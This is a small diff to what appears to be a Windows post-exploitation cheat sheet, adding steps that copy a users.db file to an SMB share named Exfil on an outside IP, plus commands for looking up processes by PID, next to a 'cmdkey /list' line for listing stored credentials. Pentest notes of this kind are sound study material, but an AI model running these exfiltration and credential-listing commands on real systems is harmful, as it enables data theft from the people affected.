@@ -65,6 +65,15 @@
 
 			New-PSDrive -Name Exfil -PSProvider -FileSystem -Root "\\10.10.14.8\share"
 
+			then copy the file
+			
+			copy users.db exfil:
+
+Get process information by pid:
+
+	Get-WmiObject Win32_Process -Filter "ProcessId = <PID>"
+	Get-Process -Id <PID>
+
 	cmdkey /list	Lists stored credentials
 
 ## Gather Network Information
